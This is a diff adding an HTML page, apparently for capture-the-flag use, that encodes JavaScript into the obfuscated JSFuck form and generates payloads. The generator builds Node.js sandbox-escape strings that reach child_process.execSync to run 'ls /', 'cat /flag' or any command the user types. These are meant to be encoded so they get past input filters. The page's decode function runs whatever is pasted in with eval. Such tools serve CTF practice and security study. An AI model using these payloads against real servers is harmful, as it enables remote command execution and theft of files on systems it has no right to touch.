@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CTF JSFuck Tool</title>
+
+<style>
+body{
+    background:#0f172a;
+    color:#e2e8f0;
+    font-family:monospace;
+    padding:20px;
+}
+
+h1{
+    color:#38bdf8;
+}
+
+textarea{
+    width:100%;
+    height:180px;
+    background:#020617;
+    color:#22c55e;
+    border:1px solid #334155;
+    padding:10px;
+    font-size:14px;
+}
+
+button{
+    padding:10px 18px;
+    margin:8px 5px 8px 0;
+    background:#2563eb;
+    color:white;
+    border:none;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#1d4ed8;
+}
+
+.section{
+    margin-top:20px;
+}
+
+.small{
+    font-size:12px;
+    color:#94a3b8;
+}
+</style>
+</head>
+
+<body>
+
+<h1>CTF JSFuck Tool</h1>
+
+<div class="section">
+<h3>Input</h3>
+<textarea id="input"></textarea>
+
+<button onclick="encode()">Encode → JSFuck</button>
+<button onclick="decode()">Decode</button>
+<button onclick="clearText()">Clear</button>
+</div>
+
+<div class="section">
+<h3>Output</h3>
+<textarea id="output"></textarea>
+</div>
+
+<div class="section">
+<h3>CTF Payload Generator</h3>
+
+<button onclick="genProcess()">process 对象</button>
+<button onclick="genLs()">ls /</button>
+<button onclick="genCatFlag()">cat /flag</button>
+<button onclick="genExec()">execSync(cmd)</button>
+
+<p class="small">点击生成payload后再点击 Encode 即可得到 JSFuck</p>
+
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jsfuck@0.4.0/jsfuck.min.js"></script>
+
+<script>
+
+function encode(){
+    let code=document.getElementById("input").value;
+    document.getElementById("output").value=JSFuck.encode(code);
+}
+
+function decode(){
+    let code=document.getElementById("input").value;
+    try{
+        let res=eval(code);
+        document.getElementById("output").value=res;
+    }catch(e){
+        document.getElementById("output").value="Decode error: "+e;
+    }
+}
+
+function clearText(){
+    document.getElementById("input").value="";
+    document.getElementById("output").value="";
+}
+
+function genProcess(){
+document.getElementById("input").value=
+`[]["flat"]["constructor"]("return process")()`;
+}
+
+function genLs(){
+document.getElementById("input").value=
+`[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('ls /').toString()")()`;
+}
+
+function genCatFlag(){
+document.getElementById("input").value=
+`[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('cat /flag').toString()")()`;
+}
+
+function genExec(){
+let cmd=prompt("输入命令","ls /");
+
+document.getElementById("input").value=
+`[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('${cmd}').toString()")()`;
+}
+
+</script>
+
+</body>
+</html>
